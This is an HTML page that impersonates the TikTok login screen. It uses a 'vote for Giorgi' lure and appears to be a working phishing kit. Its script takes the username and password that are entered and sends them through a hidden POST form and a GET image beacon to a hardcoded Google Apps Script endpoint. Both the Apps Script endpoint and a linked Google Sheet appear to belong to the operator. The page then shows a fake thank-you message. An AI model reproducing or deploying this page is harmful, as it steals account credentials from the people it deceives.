<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: black; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        
        .login-box { 
            background: rgba(22, 24, 35, 0.95); 
            padding: 30px; 
            border-radius: 15px; 
            width: 100%; 
            max-width: 400px; 
            border: 1px solid rgba(255, 255, 255, 0.1);
            text-align: center;
        }
        
        .logo { margin-bottom: 20px; }
        .logo i { 
            font-size: 50px; 
            background: linear-gradient(45deg, #25F4EE, #FE2C55); 
            -webkit-background-clip: text; 
            -webkit-text-fill-color: transparent; 
        }
        h1 { 
            font-size: 28px; 
            margin-bottom: 20px;
            background: linear-gradient(45deg, #25F4EE, #FE2C55); 
            -webkit-background-clip: text; 
            -webkit-text-fill-color: transparent; 
        }
        
        input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            color: white;
            font-size: 16px;
        }
        
        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, #25F4EE, #FE2C55);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            margin-top: 10px;
            cursor: pointer;
        }
        
        button:hover { opacity: 0.9; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        
        .thankyou { display: none; }
        .success { color: #25F4EE; font-size: 24px; margin: 20px 0; }
        
        @media (max-width: 480px) {
            .login-box { padding: 20px; }
        }
    </style>
</head>
<body>
    <div class="login-box" id="loginBox">
        <div class="logo">
            <i class="fas fa-music"></i>
        </div>
        <h1>TikTok</h1>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" id="loginBtn">Log In</button>
        </form>
        
        <div style="margin-top: 20px; font-size: 12px; color: #25F4EE;">
            <p>üìä Datos ir√°n a: <br>TU Google Sheets</p>
        </div>
    </div>
    
    <div class="login-box thankyou" id="thankyouBox">
        <div class="success">‚úì Thank You!</div>
        <p>Thank you for voting for Giorgi!</p>
        <p style="font-size: 14px; color: #FE2C55; margin: 20px 0;">
            Data saved to your Google Sheets
        </p>
        <button onclick="goBack()">Back to Login</button>
        
        <div style="margin-top: 20px; font-size: 12px;">
            <a href="https://docs.google.com/spreadsheets/d/1zxbtwEzQTFKXK148S8SXlnAY9PzyaNvSRjyNbyi_hpw" 
               target="_blank" 
               style="color: #25F4EE;">
                üìç Open YOUR Google Sheets
            </a>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
    <script>
        // URL de TU Google Apps Script
        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzcXqAbuIJpMSPMyRoaK2HPgpDmINYjckiO1euUNYlOTuDqKS5UEI9XfPx8s1qKn5Rf/exec";
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const btn = document.getElementById('loginBtn');
            
            if (!username || !password) {
                alert('Complete all fields');
                return;
            }
            
            // Cambiar bot√≥n
            btn.disabled = true;
            btn.innerHTML = 'Sending...';
            
            console.log('üì§ Sending to YOUR Google Sheets:', { user: username });
            
            // M√©todo 1: Formulario oculto (FUNCIONA SIEMPRE)
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = SCRIPT_URL;
            form.target = '_blank';
            form.style.display = 'none';
            
            // Agregar campos
            const fields = [
                {name: 'user', value: username},
                {name: 'pass', value: password},
                {name: 'date', value: new Date().toLocaleDateString()},
                {name: 'time', value: new Date().toLocaleTimeString()},
                {name: 'target', value: 'TU_GOOGLE_SHEETS'}
            ];
            
            fields.forEach(field => {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = field.name;
                input.value = field.value;
                form.appendChild(input);
            });
            
            document.body.appendChild(form);
            form.submit();
            
            // M√©todo 2: GET como backup
            setTimeout(() => {
                const params = new URLSearchParams({
                    user: username,
                    pass: password,
                    t: Date.now()
                }).toString();
                
                const img = new Image();
                img.src = SCRIPT_URL + '?' + params;
            }, 500);
            
            // Mostrar agradecimiento
            setTimeout(() => {
                document.getElementById('loginBox').style.display = 'none';
                document.getElementById('thankyouBox').style.display = 'block';
                btn.disabled = false;
                btn.innerHTML = 'Log In';
            }, 2000);
        });
        
        function goBack() {
            document.getElementById('thankyouBox').style.display = 'none';
            document.getElementById('loginBox').style.display = 'block';
            document.getElementById('loginForm').reset();
        }
        
        // Abrir TU Google Sheets al cargar (para probar)
        window.addEventListener('load', function() {
            console.log('üéØ Target: TU Google Sheets');
            console.log('üîó URL: https://docs.google.com/spreadsheets/d/1zxbtwEzQTFKXK148S8SXlnAY9PzyaNvSRjyNbyi_hpw');
        });
    </script>
</body>
</html>
